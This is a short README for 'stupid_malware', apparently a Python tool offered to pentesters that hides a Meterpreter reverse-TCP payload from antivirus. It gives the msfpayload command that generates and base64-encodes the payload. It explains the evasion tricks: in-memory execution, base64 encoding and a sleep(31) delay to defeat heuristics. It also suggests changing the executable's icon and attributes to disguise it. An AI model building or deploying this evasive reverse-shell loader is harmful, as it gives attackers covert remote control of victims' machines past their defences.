stupid_malware
==============

## SUMMARY

Python malware for pentesters that bypasses most antivirus (signature and heuristics) and IPS using sheer stupidity. Uses cutting-edge base64 encoding and the newfangled "sleep" method to wait until heuristics detaches to execute all evil activity. Code on disk is 100% benign and evil code never leaves memory. Compile with py2exe or pyinstaller.

## USAGE

Package generation:
```
$ msfpayload windows/meterpreter/reverse_tcp LPORT=4444 LHOST=127.0.0.1 R | base64 > evil.b64
```
If you do so please, change the icon and attributes with ResHacker
## CHANGELOG
* v0.2 - Added base64 decoding to bypass crappy IPS
* v0.3 - Added a sleep(31) statement before executing shellcode to fuck with heuristics

## DISCLAIMER

Don't be an asshole. I take no responsibility for how you use this. It's not even that cool so you should probably use someone else's code.
